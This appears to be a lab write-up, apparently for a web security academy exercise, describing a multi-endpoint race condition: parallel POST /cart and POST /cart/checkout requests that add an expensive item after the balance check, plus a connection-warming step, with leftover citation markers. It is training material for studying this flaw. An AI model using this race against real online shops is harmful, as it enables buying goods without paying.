# Payload 03 – Multi-Endpoint Race

## Endpoints

```http
POST /cart
POST /cart/checkout
```

---

## Cart Modification

Example structure:

```http
POST /cart HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION
Content-Type: application/x-www-form-urlencoded

productId=1&quantity=1
```

---

## Checkout

```http
POST /cart/checkout HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION
Content-Type: application/x-www-form-urlencoded

csrf=YOUR-CSRF
```

---

## Race

Send:

```text
POST /cart
       +
POST /cart/checkout
```

in parallel.

The relevant race is between:

```text
Checkout validates balance
          ↓
       RACE WINDOW
          ↓
Checkout confirms order

while:

POST /cart
    ↓
adds expensive item
```

---

## Test Sequence

### Baseline

```text
POST /cart
POST /cart/checkout
```

Sequentially.

Expected:

```text
Insufficient funds
```

### Race

```text
POST /cart ──────┐
                 ├──→ parallel
POST /checkout ──┘
```

Repeat if necessary.

The source explicitly notes that the attack may require several attempts. :contentReference[oaicite:4]{index=4}

---

## Connection Warming

If timing is inconsistent:

```http
GET /
```

can be placed before the attack requests to warm the connection.

Concept:

```text
GET /
 ↓
POST /cart
 ↓
POST /cart/checkout
```

This can reduce connection-related timing differences. :contentReference[oaicite:5]{index=5}